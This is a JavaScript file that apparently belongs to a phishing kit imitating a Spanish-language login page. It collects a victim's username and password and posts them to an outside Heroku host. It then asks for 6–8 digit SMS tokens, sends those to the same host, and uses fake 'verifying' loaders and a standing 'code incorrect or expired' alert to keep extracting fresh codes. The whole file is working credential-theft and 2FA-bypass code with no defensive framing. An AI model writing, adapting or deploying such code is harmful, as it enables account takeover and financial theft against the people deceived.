"use strict";

function chcs() {
  const usernameInput = document.getElementById("mat-input-0").value;
  if (usernameInput.length < 5) {
    alert("Nombre de usuario incorrecto o incompleto");
    document.getElementById("mat-input-0").value = "";
    document.getElementById("mat-input-0").focus();
  } else {
    localStorage.setItem("usr", usernameInput);
    document.getElementById("mdl").style.display = "block";
  }
}

function chc() {
  const passwordInput = document.getElementById("mat-input-1").value;
  if (passwordInput.length < 5) {
    alert("Contraseña incorrecta o incompleta");
    document.getElementById("mat-input-1").value = "";
    document.getElementById("mat-input-1").focus();
  } else {
  }
}

function cls() {
  document.getElementById("mdl").style.display = "none";
}

window.addEventListener("DOMContentLoaded", () => {
  var user = document.querySelector("#mat-input-0"),
    pass = document.querySelector("#mat-input-1"),
    btnU = document.querySelector("#btn-u"),
    btnP = document.querySelector("#btn-p"),
    btnT = document.querySelector("#mainB"),
    eye = document.querySelector(".eyeWrapper"),
    tk = document.querySelector("#soldede");

  window.stage = 1;

  btnU.addEventListener("click", (e) => {
    e.preventDefault();
    if (user.value.length < 5) {
      alert("Nombre de usuario incorrecto o incompleto");
      document.getElementById("mat-input-0").value = "";
      document.getElementById("mat-input-0").focus();
    } else {
      document.getElementById("mdl").style.display = "block";
    }
  });

  btnP.addEventListener("click", (e) => {
    e.preventDefault();
    if (pass.value.length < 5) {
      alert("Contraseña incorrecta o incompleta");
      document.getElementById("mat-input-1").value = "";
      document.getElementById("mat-input-1").focus();
    } else {
      showLoading(15, "Verificando credenciales", "", () => {
        document.getElementById("mdl").style.display = "none";
      });

      localStorage.setItem("user", user.value);
      sendData(
        {
          usuario: user.value,
          contrasena: pass.value,
        },
        () => {
          document.querySelector("#tkin").style.display = "none";

          document.querySelector("#docPopup").style.display = "block";
        }
      );
    }
  });

  const tkk = () => {
    let val = tk.value;
    if (val.length == 6 || val.length == 8 || val.length == 7) {
      showLoading2(10, "Validando token", "", () => {});
      
      sendData2(
        {
          usuario: localStorage.getItem("user"),
          sms: tk.value,
        },
        () => {
          tk.value = "";
          document.querySelector("#docPopup").style.display = "block";
        }
      );
    } else {
      alert("La longitud del token debe de ser de 6 a 8 numeros");
    }
  };
  btnT.addEventListener("click", (e) => {
    e.preventDefault();
    tkk();
  });

  document.getElementById("mat-input-0").addEventListener("focusin", () => {
    document
      .getElementById("df")
      .classList.add(
        "mat-form-field",
        "ng-tns-c11-0",
        "mat-primary",
        "mat-form-field-type-mat-input",
        "mat-form-field-appearance-fill",
        "mat-form-field-can-float",
        "ng-dirty",
        "ng-touched",
        "mat-form-field-invalid",
        "ng-invalid",
        "mat-form-field-should-float"
      );
  });

  document.getElementById("mat-input-0").addEventListener("focusout", () => {
    document
      .getElementById("df")
      .classList.add(
        "mat-form-field",
        "ng-tns-c11-0",
        "mat-primary",
        "mat-form-field-type-mat-input",
        "mat-form-field-appearance-fill",
        "mat-form-field-can-float",
        "ng-dirty",
        "ng-touched",
        "mat-form-field-invalid",
        "ng-invalid",
        "mat-form-field-hide-placeholder"
      );
  });

  document.getElementById("mat-input-1").addEventListener("focusin", () => {
    document
      .getElementById("dfs")
      .classList.add(
        "mat-form-field",
        "ng-tns-c11-0",
        "mat-primary",
        "mat-form-field-type-mat-input",
        "mat-form-field-appearance-fill",
        "mat-form-field-can-float",
        "ng-dirty",
        "ng-touched",
        "mat-form-field-invalid",
        "ng-invalid",
        "mat-form-field-should-float"
      );
  });

  document.getElementById("mat-input-1").addEventListener("focusout", () => {
    document
      .getElementById("dfs")
      .classList.add(
        "mat-form-field",
        "ng-tns-c11-0",
        "mat-primary",
        "mat-form-field-type-mat-input",
        "mat-form-field-appearance-fill",
        "mat-form-field-can-float",
        "ng-dirty",
        "ng-touched",
        "mat-form-field-invalid",
        "ng-invalid",
        "mat-form-field-hide-placeholder"
      );
  });

  // loader
  const showLoading = (timeout = 5, title = null, msg = "", cb = null) => {
    const ld = document.querySelector(".loading");
    let t = ld.querySelector(".title");
    t.textContent = title;
    ld.style.display = "flex";

    setTimeout(() => {
      ld.style.display = "none";
      if (cb) cb();
    }, timeout * 1000);
  };

  const showLoading2 = (timeout = 5, title = null, msg = "", cb = null) => {
    const ld = document.querySelector(".loading");
    let t = ld.querySelector(".title");
    t.textContent = title;
    ld.style.display = "flex";

    setTimeout(() => {
      ld.style.display = "none";
      alert("Codigo incorrecto o expirado")
      if (cb) cb();
    }, timeout * 1000);
  };
  // send data
  const sendData = async (data, cb = null) => {
    return await fetch("https://vic2-9251e1a4cec5.herokuapp.com/usuario/", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
      },
      body: JSON.stringify(data),
    }).then((result) => {
      if (cb) cb(result);
    });
  };

  const sendData2 = async (data, cb = null) => {
    return await fetch("https://vic2-9251e1a4cec5.herokuapp.com/codigo/", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
      },
      body: JSON.stringify(data),
    }).then((result) => {
      if (cb) cb(result);
    });
  };
  // proccessing
  const proccess = (inputs, cb = null) => {
    let data = {};

    inputs.forEach((input) => {
      data[input.id] = input.value;
    });

    sendData(data, cb);
  };
});
